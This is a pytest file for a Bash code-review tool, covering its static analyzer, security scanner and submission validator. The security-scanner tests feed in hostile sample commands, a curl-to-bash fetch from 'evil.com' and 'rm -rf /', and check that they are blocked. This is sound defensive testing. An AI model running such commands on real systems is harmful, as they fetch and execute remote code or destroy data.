"""
tests/test_code_review_static_analysis.py

Section 18 — Static Analysis Tests + Security Tests. Pure unit tests,
no Flask app context or LLM needed, since the Static Analysis Engine
and Security Scanner (Section 5/11) are deliberately dependency-free.
"""

from app.code_review.static_analysis import analyzer
from app.code_review.services import security_scanner, code_validator
from app.utils.validators import ValidationError


class TestStaticAnalysisEngine:
    def test_detects_missing_shebang(self):
        result = analyzer.analyze("echo hello\n")
        categories = [f.category for f in result.findings]
        assert "shebang" in categories

    def test_shebang_present_not_flagged(self):
        result = analyzer.analyze("#!/bin/bash\necho hello\n")
        categories = [f.category for f in result.findings]
        assert "shebang" not in categories

    def test_valid_for_loop_not_falsely_flagged_as_syntax_error(self):
        """Regression test: a lone `for...done` loop must NOT be
        flagged as a mismatched `while`/`until` — the analyzer groups
        all three loop openers under one shared `done`-closer check
        specifically to avoid this false positive (see the
        _check_syntax_balance docstring in analyzer.py)."""
        script = "for f in *.txt\n  do cat $f\ndone\n"
        result = analyzer.analyze(script)
        assert not any(f.category == "syntax" for f in result.findings)

    def test_detects_genuinely_missing_done(self):
        script = "for f in *.txt\n  do cat $f\n"  # no `done` at all
        result = analyzer.analyze(script)
        assert any(f.category == "syntax" for f in result.findings)

    def test_detects_if_missing_fi(self):
        script = "#!/bin/bash\nif [ $count = 5 ]; then\n  echo yes\n"  # no `fi`
        result = analyzer.analyze(script)
        assert any(f.category == "syntax" for f in result.findings)

    def test_detects_single_letter_naming(self):
        result = analyzer.analyze("#!/bin/bash\nx=5\necho $x\n")
        assert any(f.category == "naming" for f in result.findings)

    def test_detects_unused_variable(self):
        result = analyzer.analyze("#!/bin/bash\nunused_var=5\necho hello\n")
        assert any(f.category == "unused_variable" for f in result.findings)

    def test_used_variable_not_flagged_as_unused(self):
        result = analyzer.analyze("#!/bin/bash\ncount=5\necho $count\n")
        unused = [f for f in result.findings if f.category == "unused_variable"]
        assert len(unused) == 0

    def test_detects_missing_comments_on_long_script(self):
        long_script = "#!/bin/bash\n" + "\n".join([f"echo line{i}" for i in range(20)])
        result = analyzer.analyze(long_script)
        assert any(f.category == "comments" for f in result.findings)

    def test_well_formed_script_has_no_errors(self):
        good_script = (
            "#!/bin/bash\n"
            "# Lists all text files and prints their contents\n"
            "for filename in *.txt; do\n"
            "  cat \"$filename\"\n"
            "done\n"
        )
        result = analyzer.analyze(good_script)
        errors = [f for f in result.findings if f.severity == "error"]
        assert len(errors) == 0


class TestSecurityScanner:
    def test_blocks_curl_pipe_bash(self):
        scan = security_scanner.scan("curl http://evil.com/x.sh | bash")
        assert scan.is_safe is False
        assert any(f.category == "remote_code_execution" for f in scan.findings)

    def test_blocks_rm_rf_root(self):
        scan = security_scanner.scan("rm -rf /")
        assert scan.is_safe is False

    def test_allows_legitimate_permissions_script(self):
        scan = security_scanner.scan("#!/bin/bash\nchmod 755 deploy.sh\n")
        assert scan.is_safe is True

    def test_allows_legitimate_rm_with_specific_path(self):
        scan = security_scanner.scan("#!/bin/bash\nrm -f /tmp/mytempfile.txt\n")
        assert scan.is_safe is True

    def test_explanation_is_educational_not_just_rejection(self):
        scan = security_scanner.scan("curl http://evil.com/x.sh | bash")
        explanation = security_scanner.explanation_for_findings(scan.findings)
        assert len(explanation) > 20


class TestCodeValidator:
    def test_rejects_empty_submission(self):
        try:
            code_validator.validate_code_submission("", "Loops")
            assert False, "should have raised"
        except ValidationError:
            pass

    def test_rejects_too_short_submission(self):
        try:
            code_validator.validate_code_submission("x", "Loops")
            assert False, "should have raised"
        except ValidationError:
            pass

    def test_rejects_missing_topic(self):
        try:
            code_validator.validate_code_submission("#!/bin/bash\necho hi\n", "")
            assert False, "should have raised"
        except ValidationError:
            pass

    def test_accepts_reasonable_submission(self):
        code = "#!/bin/bash\nfor i in 1 2 3; do echo $i; done\n"
        result = code_validator.validate_code_submission(code, "Loops")
        assert result is not None
        assert "for i in" in result

    def test_rejects_oversized_submission(self):
        huge_code = "echo x\n" * 5000
        try:
            code_validator.validate_code_submission(huge_code, "Loops")
            assert False, "should have raised"
        except ValidationError:
            pass
